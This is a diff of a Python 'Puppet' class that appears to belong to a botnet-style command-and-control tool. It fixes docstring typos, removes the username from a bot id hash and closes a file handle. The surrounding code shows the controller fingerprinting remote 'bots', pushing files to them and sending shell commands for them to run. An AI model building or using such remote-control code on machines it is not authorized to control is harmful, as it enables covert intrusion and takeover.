@@ -68,12 +68,12 @@ class Puppet:
 
     def set_info(self):
         """ Gets the bot info over the socket and fills the object attributes
-            with the respectives responses.
+            with the respective responses.
             After sending the 'send info' command (that start the requests for
-            the bot informations), it will receive and convert bytes to integer
-            (the lenght of the next string to be received, in bytes), and then
-            receive the the respective string and assignts it to the respective
-            object attribute. This proccess will repeat for each attribute to
+            the bot information), it will receive and convert bytes to integer
+            (the length of the next string to be received, in bytes), and then
+            receive the the respective string and assigns it to the respective
+            object attribute. This process will repeat for each attribute to
             ensure that the bytes are being received correctly
 
         """
@@ -92,12 +92,11 @@ class Puppet:
         self.set_id_hash()
 
     def set_id_hash(self):
-        """ Sets the hash attribute based on some of the othres attributes """
+        """ Sets the hash attribute based on some of the others attributes """
         string = self.architecture
         string += self.op_system
         string += self.kernel_release
         string += self.hostname
-        string += self.username
         self.id_hash = md5(string.encode()).hexdigest()
 
     def disconnect(self):
@@ -169,6 +168,7 @@ class Puppet:
                 self.socket_fd.send(bytes(destination_path, 'utf-8'))
                 file_data = file.read()
                 self.socket_fd.sendall(file_data)
+                file.close()
         except (FileNotFoundError, socket.error) as error:
             if "No such file or directory" in error:
                 print(to_red(f"\n[ ! ] File not found: {source_path}\n"))
@@ -182,7 +182,7 @@ class Puppet:
 
     def run_command(self, command):
         """ Sends a shell command to be executed on the bot without grabbing its
-            stdout and stderror
+            stdout and stderr
 
         """
         self.socket_fd.send(bytes("remote cmd", 'utf-8'))
